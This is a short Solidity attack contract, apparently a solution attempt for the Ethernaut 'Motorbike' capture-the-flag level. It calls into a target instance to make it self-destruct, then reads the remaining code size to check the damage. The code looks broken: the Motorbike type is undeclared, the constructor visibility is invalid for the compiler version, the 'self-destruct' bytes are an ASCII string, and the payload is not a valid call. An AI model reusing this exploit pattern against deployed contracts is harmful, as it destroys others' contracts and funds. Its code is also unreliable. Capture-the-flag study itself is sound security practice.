// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Sabotage {

    Motorbike instance;
    
    constructor(address payable $your_ethernaut_instance_here) public {
        instance = Motorbike($your_ethernaut_instance_here);
    }

    function sugarInYourEngine() public {
        // address(instance).call(abi.encodeWithSignature('selfdestruct(address)', address(this)));
        bytes memory selfDestruct = bytes("0x00FF");
        address(instance).call(abi.encode(selfDestruct));
    }

    function inspectDamage() public returns (uint) {
        uint256 size;
        address engine = address(instance);
        assembly {
            size := extcodesize(engine)
        }
        return size;
    }
}
